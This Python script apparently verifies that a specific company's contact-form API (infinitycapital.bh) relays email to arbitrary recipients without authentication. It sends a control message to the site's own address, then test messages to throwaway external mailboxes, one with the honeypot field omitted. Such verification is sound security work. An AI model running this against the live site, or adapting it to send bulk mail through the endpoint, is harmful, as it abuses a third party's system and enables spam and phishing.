#!/usr/bin/env python3
"""Independent verification of unauthenticated email-relay on the contact-form API.

No cookies, no auth header, no Origin/Referer, no CSRF token.
Recipient ('targets') is the ONLY variable between the control and the relay test.
"""
import json, os, time, urllib.request, urllib.error, uuid

API = "https://www.infinitycapital.bh/api/send"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
OUT = os.path.dirname(os.path.abspath(__file__))

def post(label, targets, check="0"):
    boundary = "----VerifyBoundary" + uuid.uuid4().hex
    fields = {
        "fname": "Independent", "lname": "Verifier", "areacode": "+973",
        "tel": "3600000", "cname": "SecAudit",
        "subject": "Verifier %s" % label,
        "msg": "RELAY-TEST body token XYZ123 label=%s" % label,
        "check": check, "targets": targets,
    }
    parts = []
    for k, v in fields.items():
        parts.append("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (boundary, k, v))
    body = ("".join(parts) + "--%s--\r\n" % boundary).encode()

    req = urllib.request.Request(API, data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=%s" % boundary)
    req.add_header("Accept", "application/json")
    req.add_header("User-Agent", UA)
    # NOTE: deliberately NO Cookie, NO Authorization, NO Origin, NO Referer, NO CSRF token

    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            code, txt, hdrs = r.status, r.read().decode("utf-8", "replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        code, txt, hdrs = e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
    dt = time.time() - t0

    rec = {"label": label, "targets": targets, "check": check, "http_status": code,
           "elapsed_s": round(dt, 2), "body": txt,
           "content_type": hdrs.get("Content-Type"), "x_matched_path": hdrs.get("X-Matched-Path"),
           "server": hdrs.get("Server"), "x_vercel_id": hdrs.get("X-Vercel-Id")}
    print("### %s  targets=%s  check=%s\n  HTTP %s in %ss  %s\n  %s\n" %
          (label, targets, check, code, round(dt, 2), hdrs.get("Content-Type"), txt))
    with open(os.path.join(OUT, "%s.json" % label), "w") as f:
        json.dump(rec, f, indent=2)
    return rec

results = []
# 1. CONTROL: the recipient the site itself is configured to use
results.append(post("control_legit", "info@infinitycapital.bh"))
# 2. RELAY: arbitrary unrelated third-party mailbox on a foreign domain
ext = "vrfy%d%s@mailinator.com" % (int(time.time()), uuid.uuid4().hex[:6])
results.append(post("relay_external", ext))
# 3. RELAY: honeypot field entirely OMITTED (no client-side bot filter on server)
results.append(post("relay_nohoneypot", "vrfy2%d%s@mailinator.com" % (int(time.time()), uuid.uuid4().hex[:6]), check=None))

print("=" * 70)
for r in results:
    ok = r["http_status"] == 200 and '"data":{"id"' in r["body"].replace(" ", "")
    print("%-18s -> %-8s HTTP=%s  accepted_with_message_id=%s" %
          (r["label"], r["targets"], r["http_status"], ok))
    print("   raw: %s" % r["body"][:300])
